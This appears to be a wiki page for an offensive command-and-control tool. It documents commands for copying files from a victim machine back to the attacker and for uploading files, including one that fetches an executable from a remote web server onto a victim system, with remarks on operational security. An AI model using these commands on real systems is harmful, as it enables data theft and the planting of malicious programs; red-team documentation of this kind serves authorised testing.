# File Management

[[images/file-management-help.PNG]]

### Download-File

Simply enter the path and name of the file to download, (copy back to the attackers system).

`Download-File -Source C:\Temp\Run.exe`

### Upload-File

Opposite of the above command

`Upload-File -Source C:\Temp\Run.exe -Destination C:\Temp\Test.exe`

This is not considered the be Opsec safe for obvious reasons.

### Web-Upload-File

Here we have the option to upload a file to a victim system but this time we allow for the file to be copied from a remote web server. Again this command is not considered Opsec safe.

`Web-Upload-File -From 'http://www.example.com/App.exe' -To 'C:\Temp\App.exe'`
